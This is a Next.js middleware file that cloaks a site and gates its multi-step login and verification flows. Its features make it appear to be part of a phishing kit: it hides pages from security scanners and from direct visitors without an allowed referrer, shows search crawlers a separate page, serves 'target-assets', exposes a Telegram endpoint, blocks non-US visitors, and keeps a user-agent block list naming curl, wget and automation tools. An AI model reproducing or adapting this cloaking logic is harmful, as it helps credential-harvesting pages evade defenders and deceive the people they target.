import { NextResponse } from "next/server"
import type { NextFetchEvent, NextRequest } from "next/server"
import { readRiskCookie } from "@/lib/bot-risk/cookie"
import { applyNavProofCookie } from "@/lib/bot-risk/proof-cookies"
import { isMitigationBand } from "@/lib/bot-risk/score"
import { notifyBotCrawlIfNeeded } from "@/lib/bot-verification/bot-crawl-middleware"
import { isDeniedBotUserAgent } from "@/lib/bot-verification/denied-bots"
import { evaluateOriginRequestGate } from "@/lib/bot-verification/origin-request-gate"
import {
  isAppleCrawlerUA,
  isBaiduCrawlerUA,
  isBingCrawlerUA,
  isCrawlerSeoPageUA,
  isDuckDuckCrawlerUA,
  isGoogleCrawlerUA,
  isSearchCrawlerUA,
  isYahooCrawlerUA,
} from "@/lib/bot-detection"
import { buildErrorScreenHtml } from "@/lib/error-screen-html"
import { getRequestCountryCode } from "@/lib/edge-geo"
import { GEO_US_ONLY_HEADER } from "@/lib/geo-us-header"
import { isLocalTestingUnlocked } from "@/lib/local-testing"
import { isSeoCrawlerPath } from "@/lib/seo-crawler-paths"
import { isUngatedSeoPath } from "@/lib/seo-public-paths"
import { SITE_URL } from "@/lib/site-url"
import { isYandexVerificationPath } from "@/lib/yandex-verification"
import { isAllowedSearchOrBacklinkReferrer } from "@/lib/allowed-referrer"
import { isCrawlerSeoPreviewUnlocked } from "@/lib/crawler-seo-preview"
import { CRAWLER_PATTERN } from "@/lib/crawler-ua"
import { LANDING_ACCESS_COOKIE } from "@/lib/landing-access-cookie"
import { isTrustedCrawlerUserAgent } from "@/utils/botDetection"

/**
 * Step 4 — Steins Gate middleware: single gate chain for the whole app.
 *
 * Order (never reorder — A1): origin gate → [local-testing bypass] → bot
 * handler → risk cookie → geo header → project flow guards → SINGLE EXIT
 * (`nextWithHeaders`) where the Astro landing rewrite + cookie stamps live.
 * Denied bots short-circuit to `deniedBotErrorResponse()` (HTTP 200 Chrome
 * ErrorScreen + X-Robots-Tag: noindex) BEFORE any rewrite. No document ever
 * returns plain `403 Forbidden` (Rule 3).
 *
 * Header trust (A0): client IP / ASN / geo decisions read only proxy-owned
 * headers — see `lib/client-ip.ts` + `lib/bot-verification/origin-request-gate.ts`.
 */

/** `/` is served by Astro. Both variants are pre-built into public/. */
const ASTRO_LANDING_HTML = "/index.html"
const ASTRO_CRAWLER_HTML = "/crawler-seo.html"

/**
 * Marker appended when the incoming pathname already equals the rewrite target
 * (e.g. a direct GET of /index.html). Without it Next would see a self-rewrite
 * loop; with it the request resolves to the same static file exactly once.
 */
const ASTRO_VARIANT_MARKER = "astroVariant"

/** Public assets — must not be blocked by geo or bot rules. */
const PUBLIC_BRAND_ASSETS = new Set([
  "/error-icon.png",
  "/favicon.ico",
  "/favicon.png",
  "/favicon-32x32.png",
  "/30_image.png",
  "/icon-48x48.png",
  "/icon-32x32.png",
  "/apple-touch-icon.png",
  "/og-image.png",
])

/**
 * Asset bypass (A3): Astro hashed assets + this project's downloaded target
 * assets are static files, exempt from every gate. Variant files
 * (`index.html` / `crawler-seo.html`) are deliberately NOT exempt — they are
 * the physical bodies of `/` and must stay gated (A3b).
 */
function isPublicAssetPath(pathname: string): boolean {
  return (
    PUBLIC_BRAND_ASSETS.has(pathname) ||
    pathname.startsWith("/_astro/") ||
    pathname.startsWith("/target-assets/")
  )
}

/**
 * Single place that stamps search-crawler request headers.
 * Always pass the returned Headers into nextWithHeaders — never rebuild from
 * request.headers. @see SEO_CRAWLER_RULES.md — HARD RULES: crawler header integrity
 */
function applySearchCrawlerHeaders(request: NextRequest): Headers {
  const requestHeaders = new Headers(request.headers)
  const ua = request.headers.get("user-agent") ?? ""
  const { pathname } = request.nextUrl

  requestHeaders.set("x-pathname", pathname)

  // Denied bots never get crawler SEO stamps (even if UA contains "bot").
  if (isDeniedBotUserAgent(ua)) {
    return requestHeaders
  }

  if (isSearchCrawlerUA(ua)) {
    requestHeaders.set("x-is-search-crawler", "1")
    if (isGoogleCrawlerUA(ua)) requestHeaders.set("x-is-googlebot", "1")
    if (isBingCrawlerUA(ua)) requestHeaders.set("x-is-bingbot", "1")
    if (isDuckDuckCrawlerUA(ua)) requestHeaders.set("x-is-duckduckbot", "1")
    if (isYahooCrawlerUA(ua)) requestHeaders.set("x-is-yahoobot", "1")
    if (isAppleCrawlerUA(ua)) requestHeaders.set("x-is-applebot", "1")
    if (isBaiduCrawlerUA(ua)) requestHeaders.set("x-is-baiduspider", "1")
  }

  // Ranking ∪ social ∪ discovery → crawler twin on SEO paths (Step 5 body).
  if (isCrawlerSeoPageUA(ua) && isSeoCrawlerPath(pathname)) {
    requestHeaders.set("x-crawler-seo-page", "1")
  }

  return requestHeaders
}

/**
 * THE single exit helper (A1). Origin, bot, risk, geo and the project flow
 * guards all run before this; the Astro landing rewrite happens here and only
 * here, AFTER every gate.
 */
function nextWithHeaders(requestHeaders: Headers, request?: NextRequest): NextResponse {
  const pathname = request?.nextUrl.pathname ?? requestHeaders.get("x-pathname") ?? ""

  // `/` + the two pre-built variant files are ONE logical landing entry (A3b).
  const isAstroLandingEntry =
    pathname === "/" ||
    pathname === ASTRO_LANDING_HTML ||
    pathname === ASTRO_CRAWLER_HTML

  // Direct GET /crawler-seo.html IS crawler intent; CSP=1 preview forces the
  // twin for local QA; `/` + /index.html stay the human variant.
  const wantsCrawlerVariant =
    requestHeaders.get("x-crawler-seo-page") === "1" ||
    isCrawlerSeoPreviewUnlocked() ||
    pathname === ASTRO_CRAWLER_HTML

  // SSR cloak for direct human visits (no allowed Referer + no grant cookie →
  // ErrorScreen with no login flash). Crawlers, local testing and post-grant
  // session reloads pass. Same-origin referrer never grants (allowed-referrer).
  if (
    request &&
    isAstroLandingEntry &&
    !wantsCrawlerVariant &&
    !isLocalTestingUnlocked()
  ) {
    const hasGrant = request.cookies.get(LANDING_ACCESS_COOKIE)?.value === "1"
    const referer =
      request.headers.get("referer") ?? request.headers.get("referrer") ?? ""
    if (!hasGrant && !isAllowedSearchOrBacklinkReferrer(referer, request.nextUrl.origin)) {
      return deniedBotErrorResponse(request)
    }
  }

  let response: NextResponse

  if (request && isAstroLandingEntry) {
    const astroFile = wantsCrawlerVariant ? ASTRO_CRAWLER_HTML : ASTRO_LANDING_HTML
    // Preserve the original query (?loginDenied=1 …); add the self-rewrite
    // marker only when the incoming pathname already equals the target.
    const params = new URLSearchParams(request.nextUrl.search)
    if (pathname === astroFile) params.set(ASTRO_VARIANT_MARKER, "1")
    const qs = params.toString()
    const astroTarget = qs ? `${astroFile}?${qs}` : astroFile
    response = NextResponse.rewrite(new URL(astroTarget, request.nextUrl))
  } else {
    response = NextResponse.next({ request: { headers: requestHeaders } })
  }

  if (requestHeaders.get("x-crawler-seo-page") === "1") {
    response.headers.set("x-crawler-seo-page", "1")
    response.cookies.set("x-crawler-seo-page", "1", {
      httpOnly: true,
      path: "/",
      maxAge: 60,
      sameSite: "lax",
    })
  }

  if (
    request &&
    !pathname.startsWith("/api") &&
    !pathname.startsWith("/_next") &&
    !pathname.startsWith("/_astro")
  ) {
    applyNavProofCookie(response)
  }

  // Gate-parity cookies the island reads through document.cookie (A2) —
  // NOT httpOnly: the island can only see document.cookie.
  if (request && isAstroLandingEntry) {
    const userAgent = requestHeaders.get("user-agent") ?? ""
    response.cookies.set("landing_bot", CRAWLER_PATTERN.test(userAgent) ? "1" : "0", {
      httpOnly: false,
      path: "/",
      maxAge: 60,
      sameSite: "lax",
    })
    response.cookies.set(
      "landing_geo",
      requestHeaders.get(GEO_US_ONLY_HEADER) ?? "unknown",
      { httpOnly: false, path: "/", maxAge: 60, sameSite: "lax" },
    )
  }

  return response
}

function deniedBotErrorResponse(request: NextRequest): NextResponse {
  const host =
    request.headers.get("host")?.split(":")[0] ||
    (() => {
      try {
        return new URL(SITE_URL).hostname
      } catch {
        return "this site"
      }
    })()

  return new NextResponse(buildErrorScreenHtml(host), {
    status: 200,
    headers: {
      "Content-Type": "text/html; charset=utf-8",
      "Cache-Control": "private, no-cache, no-store, must-revalidate",
      "Pragma": "no-cache",
      "Expires": "0",
      "X-Robots-Tag": "noindex, nofollow, noarchive",
      "X-Content-Type-Options": "nosniff",
    },
  })
}

function originRateLimitResponse(request: NextRequest): NextResponse {
  const { pathname } = request.nextUrl
  if (pathname.startsWith("/api")) {
    return NextResponse.json({ error: "Too Many Requests" }, { status: 429 })
  }
  return deniedBotErrorResponse(request)
}

async function handleOriginGateIfNeeded(request: NextRequest): Promise<NextResponse | null> {
  const { pathname } = request.nextUrl
  const decision = await evaluateOriginRequestGate(request)

  if (decision.action === "allow") return null

  if (decision.action === "rate_limit") {
    return originRateLimitResponse(request)
  }

  // Cloak — still serve brand/SEO/asset files so ErrorScreen + landing CSS load.
  if (
    isPublicAssetPath(pathname) ||
    pathname === "/error-icon.png" ||
    pathname === "/robots.txt" ||
    pathname === "/sitemap.xml" ||
    isUngatedSeoPath(pathname) ||
    isYandexVerificationPath(pathname)
  ) {
    return null
  }

  return deniedBotErrorResponse(request)
}

/**
 * Geo (US-only) header stamping. Mutates `requestHeaders` in place and lets
 * the request CONTINUE to the single exit — the island's SteinsGate enforces
 * the block client-side (geoAccess=block → ErrorScreen). Only the legacy
 * `/geo-restricted` bounce returns early. Trusted crawlers skip the stamp.
 * A4: this helper only mutates the stamped requestHeaders in place — it never
 * rebuilds a fresh header set from the raw incoming request.
 */
function applyGeoHeaderIfNeeded(request: NextRequest, requestHeaders: Headers): NextResponse | null {
  const { pathname } = request.nextUrl

  if (pathname === "/geo-restricted" || pathname.startsWith("/geo-restricted/")) {
    const url = request.nextUrl.clone()
    url.pathname = "/"
    const res = NextResponse.redirect(url)
    res.cookies.set("geo_us_block", "1", { path: "/", maxAge: 120, sameSite: "lax" })
    return res
  }

  if (pathname.startsWith("/api") || pathname.startsWith("/_next")) return null
  if (
    isPublicAssetPath(pathname) ||
    pathname === "/robots.txt" ||
    pathname === "/sitemap.xml" ||
    isUngatedSeoPath(pathname) ||
    isYandexVerificationPath(pathname)
  ) {
    return null
  }

  const userAgent = request.headers.get("user-agent") || ""
  if (isTrustedCrawlerUserAgent(userAgent) || isCrawlerSeoPageUA(userAgent)) {
    return null
  }

  if (request.cookies.get("geo_us_block")?.value === "1") {
    requestHeaders.set(GEO_US_ONLY_HEADER, "block")
    return null
  }

  const country = getRequestCountryCode(request)

  if (country && country !== "US") {
    requestHeaders.set(GEO_US_ONLY_HEADER, "block")
    return null
  }
  if (!country) {
    requestHeaders.set(GEO_US_ONLY_HEADER, "unknown")
    return null
  }
  requestHeaders.set(GEO_US_ONLY_HEADER, "allow")
  return null
}

const STRICT_BLOCKED_BOT_PATTERNS = [
  /curl/i,
  /wget/i,
  /httpclient/i,
  /python-requests/i,
  /axios/i,
  /okhttp/i,
  /libwww-perl/i,
  /go-http-client/i,
  /\bjava\b/i,
  /\bphp\b/i,
  /headlesschrome/i,
  /puppeteer/i,
  /playwright/i,
  /phantomjs/i,
  /selenium/i,
]

const SOFT_BLOCKED_BOT_PATTERNS = [/bot/i, /crawler/i, /spider/i, /scraper/i]

async function handleBotIfNeeded(
  request: NextRequest,
  requestHeaders: Headers,
): Promise<NextResponse | null> {
  const { pathname } = request.nextUrl
  const userAgent = request.headers.get("user-agent") || ""

  if (!userAgent) {
    if (
      pathname === "/robots.txt" ||
      pathname === "/sitemap.xml" ||
      isPublicAssetPath(pathname) ||
      isUngatedSeoPath(pathname) ||
      isYandexVerificationPath(pathname) ||
      pathname.startsWith("/api/bot-fingerprint") ||
      pathname.startsWith("/api/bot-honeypot") ||
      pathname.startsWith("/_next")
    ) {
      return nextWithHeaders(requestHeaders, request)
    }
    if (pathname.startsWith("/api")) {
      return new NextResponse("Forbidden", { status: 403 })
    }
    return deniedBotErrorResponse(request)
  }

  // Competitive SEO + security scanners → SSR ErrorScreen (no login HTML).
  if (isDeniedBotUserAgent(userAgent)) {
    if (
      isPublicAssetPath(pathname) ||
      pathname === "/error-icon.png" ||
      pathname === "/robots.txt" ||
      pathname === "/sitemap.xml" ||
      isUngatedSeoPath(pathname) ||
      isYandexVerificationPath(pathname)
    ) {
      return nextWithHeaders(requestHeaders, request)
    }
    return deniedBotErrorResponse(request)
  }

  const strictMatch = STRICT_BLOCKED_BOT_PATTERNS.some((p) => p.test(userAgent))
  const softMatch = SOFT_BLOCKED_BOT_PATTERNS.some((p) => p.test(userAgent))

  if (!strictMatch && !softMatch) {
    return null
  }

  if (isTrustedCrawlerUserAgent(userAgent) || isCrawlerSeoPageUA(userAgent)) {
    return null
  }

  if (
    pathname === "/robots.txt" ||
    pathname === "/sitemap.xml" ||
    isPublicAssetPath(pathname) ||
    isUngatedSeoPath(pathname) ||
    isYandexVerificationPath(pathname)
  ) {
    return nextWithHeaders(requestHeaders, request)
  }

  // Soft + strict unknown bots on HTML: cloak with HTTP 200 (Rule 3 — never
  // plain `403 Forbidden` for documents).
  if (softMatch || strictMatch) {
    return deniedBotErrorResponse(request)
  }

  return null
}

function handleRiskCookieIfNeeded(request: NextRequest): NextResponse | null {
  const { pathname } = request.nextUrl
  if (pathname.startsWith("/api/bot-fingerprint")) return null
  if (pathname.startsWith("/api/bot-honeypot")) return null
  if (pathname.startsWith("/api/telegram")) return null
  if (pathname.startsWith("/_next") || pathname.startsWith("/_astro")) return null
  if (isPublicAssetPath(pathname)) return null
  if (
    pathname === "/robots.txt" ||
    pathname === "/sitemap.xml" ||
    isUngatedSeoPath(pathname) ||
    isYandexVerificationPath(pathname)
  ) {
    return null
  }

  const userAgent = request.headers.get("user-agent") || ""
  if (isTrustedCrawlerUserAgent(userAgent) || isCrawlerSeoPageUA(userAgent)) {
    return null
  }

  const risk = readRiskCookie(request)
  if (!risk || !isMitigationBand(risk.band)) return null

  if (pathname.startsWith("/api")) {
    return new NextResponse("Forbidden", { status: 403 })
  }

  return deniedBotErrorResponse(request)
}

// ===== Project flow guards (Step 2 — preserved verbatim) ====================
const FORGOT_FLOW_COOKIE = "forgot_flow"
const NEW_USER_FLOW_COOKIE = "new_user_flow"
const LOGIN_FLOW_COOKIE = "login_flow"

const protectedForgotPaths = [
  "/forgot-password-found",
  "/forgot-password-verify",
  "/forgot-password-code",
]

const protectedNewUserPaths = ["/new-user-code", "/new-user-password"]

function applyFlowGuards(request: NextRequest): NextResponse | null {
  const { pathname } = request.nextUrl

  if (protectedForgotPaths.includes(pathname)) {
    const hasFlowCookie = request.cookies.get(FORGOT_FLOW_COOKIE)?.value === "1"
    if (!hasFlowCookie) {
      const url = request.nextUrl.clone()
      url.pathname = "/forgot-password"
      return NextResponse.redirect(url)
    }
  }

  if (protectedNewUserPaths.includes(pathname)) {
    const flowValue = request.cookies.get(NEW_USER_FLOW_COOKIE)?.value

    if (pathname === "/new-user-code") {
      if (!(flowValue === "1" || flowValue === "2")) {
        const url = request.nextUrl.clone()
        url.pathname = "/new-user"
        return NextResponse.redirect(url)
      }
    }

    if (pathname === "/new-user-password") {
      if (flowValue !== "2") {
        const url = request.nextUrl.clone()
        url.pathname = "/new-user"
        return NextResponse.redirect(url)
      }
    }
  }

  const loginFlowValue = request.cookies.get(LOGIN_FLOW_COOKIE)?.value

  if (pathname === "/verify-choice") {
    if (!loginFlowValue) {
      const url = request.nextUrl.clone()
      url.pathname = "/"
      return NextResponse.redirect(url)
    }
  }

  if (pathname === "/verify") {
    const step = request.nextUrl.searchParams.get("step")

    if (step === "2") {
      if (loginFlowValue !== "3") {
        const url = request.nextUrl.clone()
        url.pathname = "/"
        return NextResponse.redirect(url)
      }
    } else {
      if (!loginFlowValue) {
        const url = request.nextUrl.clone()
        url.pathname = "/"
        return NextResponse.redirect(url)
      }
    }
  }

  if (pathname === "/verify-details") {
    if (!(loginFlowValue === "2" || loginFlowValue === "3")) {
      const url = request.nextUrl.clone()
      url.pathname = "/"
      return NextResponse.redirect(url)
    }
  }

  return null
}

// ============================================================================

export async function middleware(request: NextRequest, event: NextFetchEvent) {
  const { pathname } = request.nextUrl
  const requestHeaders = applySearchCrawlerHeaders(request)
  const userAgent = request.headers.get("user-agent") || ""
  const trustedCrawler =
    isTrustedCrawlerUserAgent(userAgent) || isCrawlerSeoPageUA(userAgent)

  if (!isLocalTestingUnlocked()) {
    notifyBotCrawlIfNeeded(request, event)
  }

  // 1) Origin gate ALWAYS runs (even with ALLOW_LOCAL_TESTING) — UA spoof /
  //    ASN / path rate-limit (A0 header trust lives inside).
  const originResponse = await handleOriginGateIfNeeded(request)
  if (originResponse) {
    return originResponse
  }

  if (!isLocalTestingUnlocked()) {
    // 2) Bot classification → denied bots cloak with HTTP 200 ErrorScreen.
    const botResponse = await handleBotIfNeeded(request, requestHeaders)
    if (botResponse) {
      return botResponse
    }

    // 3) Bot-risk cookie mitigation.
    const riskResponse = handleRiskCookieIfNeeded(request)
    if (riskResponse) {
      return riskResponse
    }
  }

  // 4) Geo header stamp (US-only) — trusted crawlers exempt; block is
  //    enforced by SteinsGate/geoAccess in the island, not by dropping HTML.
  const geoRedirect = applyGeoHeaderIfNeeded(request, requestHeaders)
  if (geoRedirect) {
    return geoRedirect
  }

  // 5) Project flow guards (humans only — trusted crawlers skip, as before).
  if (!trustedCrawler) {
    const guardResponse = applyFlowGuards(request)
    if (guardResponse) {
      return guardResponse
    }
  }

  // 6) SINGLE EXIT — Astro landing rewrite + stamps happen here, AFTER every
  //    gate (A1). Never move the rewrite earlier.
  void pathname
  return nextWithHeaders(requestHeaders, request)
}

export const config = {
  matcher: [
    // `_astro` + `target-assets` are static assets that bypass every gate.
    // The variant files (index.html / crawler-seo.html) are DELIBERATELY NOT
    // excluded — they are the bodies of `/` and must stay gated (A3b).
    "/((?!_next/static|_next/image|_astro|target-assets/|error-icon\\.png|favicon\\.ico|favicon\\.png|icon-48x48\\.png|icon-32x32\\.png|apple-touch-icon\\.png|og-image\\.png|yandex_[0-9a-f]+\\.html).*)",
  ],
}
